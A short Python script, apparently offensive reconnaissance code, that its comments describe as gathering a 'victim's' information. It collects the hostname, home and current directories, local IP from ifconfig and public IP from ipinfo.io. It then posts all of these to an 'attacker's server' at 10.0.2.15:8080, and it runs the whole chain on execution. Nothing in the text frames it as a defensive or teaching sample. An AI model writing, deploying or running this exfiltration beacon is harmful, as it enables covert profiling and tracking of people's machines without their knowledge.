import os
import requests
import socket

# Function to get the public IP of the victim
def get_public_ip():
    try:
        response = requests.get('https://ipinfo.io/json')
        return response.json().get('ip', 'Unknown')
    except requests.RequestException as e:
        print(f'Error fetching public IP: {e}')
        return 'Unknown'

# Function to send collected information to the attacker's server
def ping_back(data):
    try:
        response = requests.post('http://10.0.2.15:8080/', json=data)
        if response.status_code == 200:
            print('Pingback sent successfully')
        else:
            print(f'Error sending pingback: {response.status_code}')
    except requests.RequestException as e:
        print(f'Error sending pingback: {e}')

# Function to get network info
def get_network_info():
    ip_address = 'Unknown'

    # Getting local IP address (IPv4 and non-internal)
    for iface in os.popen('ifconfig'):
        if 'inet ' in iface and not '127.0.0.1' in iface:
            ip_address = iface.split()[1]
            break

    return {
        'publicIP': 'Unknown',  # Placeholder for public IP
        'hostname': socket.gethostname(),
        'homeDirectory': os.path.expanduser("~"),
        'currentDirectory': os.getcwd(),
        'localIP': ip_address
    }

# Main function to collect data
def collect_data():
    network_info = get_network_info()
    public_ip = get_public_ip()  # Get public IP
    data = {
        **network_info,
        'publicIP': public_ip,  # Add public IP to the data
    }

    # Send the collected data back
    ping_back(data)

# Run the data collection and sending process
collect_data()

